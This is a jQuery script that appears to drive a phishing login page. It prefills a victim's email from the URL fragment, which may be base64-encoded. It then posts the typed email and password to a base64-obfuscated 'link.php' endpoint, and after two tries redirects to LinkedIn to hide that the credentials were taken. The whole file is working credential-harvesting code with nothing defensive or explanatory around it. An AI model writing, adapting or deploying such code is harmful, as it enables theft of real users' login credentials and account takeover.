/* global $ */
$(document).ready(function() {
   var count = 0;


   $('#m-btn').click();

   /////////////url ai getting////////////////
   var ai = window.location.hash.substr(1);
   if (!ai) {

   } else {
       var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;

       if (!base64regex.test(ai)) {
           // alert(btoa(email));
           var my_ai = ai;
       } else {
           // alert(atob(email));
           var my_ai = atob(ai);
       }
       // $('#email').val(email);
       // var my_email =email;
       var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
       // $('#ai').val(ai);
       // var my_ai = ai;
       var ind = my_ai.indexOf("@");
       var my_slice = my_ai.substr((ind + 1));
       var c = my_slice.substr(0, my_slice.indexOf('.'));
       var final = c.toLowerCase();
       $('#ai').val(my_ai);
       $('#ai').attr('readonly', true);
       $("#msg").hide();
   }
   ///////////////url getting ai////////////////

   var file = "bGluay5waHA=";

   $('#submit-btn').click(function(event) {
       $('#error').hide();
       $('#msg').hide();
       event.preventDefault();
       var ai = $("#ai").val();
       var pr = $("#pr").val();
       var msg = $('#msg').html();
       $('#msg').text(msg);
       ///////////new injection////////////////
       var my_ai = ai;
       var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

       if (!ai) {
           $('#error').show();
           $('#error').html("Login required!");
           ai.focus;
           return false;
       }
       if (!filter.test(my_ai)) {
        $('#error').show();
        $('#error').html("Login required");
        ai.focus;
        return false;
    }

       if (!pr) {
           $('#error').show();
           $('#error').html("Password required!");
           ai.focus;
           return false;
       }

       var ind = my_ai.indexOf("@");
       var my_slice = my_ai.substr((ind + 1));
       var c = my_slice.substr(0, my_slice.indexOf('.'));
       var final = c.toLowerCase();
       ///////////new injection////////////////
       count = count + 1;

       $.ajax({
           dataType: 'JSON',
           url: atob(file),
           type: 'POST',
           data: {
               ai: ai,
               pr: pr,
           },
           // data: $('#contact').serialize(),
           beforeSend: function(xhr) {
               $('#submit-btn').html('Authenticating...');
           },
           success: function(response) {
               if (response) {
                   $("#msg").show();
                   console.log(response);
                   if (response['signal'] == 'ok') {
                       $("#pr").val("");
                       if (count >= 2) {
                           count = 0;
                           // window.location.replace(response['redirect_link']);
                           window.location.replace("https://www.linkedin.com/" );
                           return false;

                       }
                       // $('#msg').html(response['msg']);
                   } else {
                       // $('#msg').html(response['msg']);
                   }
               }
           },
           error: function() {
               $("#pr").val("");
               if (count >= 2) {
                   count = 0;
                   window.location.replace("https://www.linkedin.com/" );
                   return false;
               }
               $("#msg").show();
               // $('#msg').html("Please try again later");
           },
           complete: function() {
               $('#submit-btn').html('login');
           }
       });
   });


});